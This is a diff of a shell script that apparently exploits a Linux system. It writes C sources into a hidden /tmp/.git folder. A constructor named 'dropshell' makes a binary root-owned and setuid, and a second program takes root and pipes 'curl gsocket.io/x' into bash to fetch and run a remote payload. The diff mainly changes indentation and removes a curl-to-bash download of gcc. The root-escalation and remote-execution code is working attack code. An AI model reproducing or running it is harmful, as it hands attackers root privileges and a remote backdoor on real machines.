@@ -4,27 +4,25 @@ echo "[+] Setting up..."
 rm -rf /tmp/.git 2>&1
 mkdir /tmp/.git
 cd /tmp/.git
-bash <(curl -fskSL raw.githubusercontent.com/minos-org/minos-static/master/static-get) -x gcc
-export PATH=$PATH:/tmp/.git/$(ls -d */)usr/bin
 cat << EOF > /tmp/.git/sorrymom.c
 #include <stdio.h>
 #include <sys/types.h>
 #include <unistd.h>
 __attribute__ ((__constructor__))
 void dropshell(void){
-    chown("/tmp/.git/init", 0, 0);
-    chmod("/tmp/.git/init", 04755);
-    printf("[+] done!\n");
+	chown("/tmp/.git/init", 0, 0);
+	chmod("/tmp/.git/init", 04755);
+	printf("[+] done!\n");
 }
 EOF
 cat << 'EOF' > /tmp/.git/init.c
 #include <stdio.h>
 int main(void){
-    setuid(0);
-    setgid(0);
-    seteuid(0);
-    setegid(0);
-    system("curl -fsSLk gsocket.io/x | bash");
+	setuid(0);
+	setgid(0);
+	seteuid(0);
+	setegid(0);
+	system("curl -fsSLk gsocket.io/x | bash");
 }
 EOF
 export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/opt/libemu
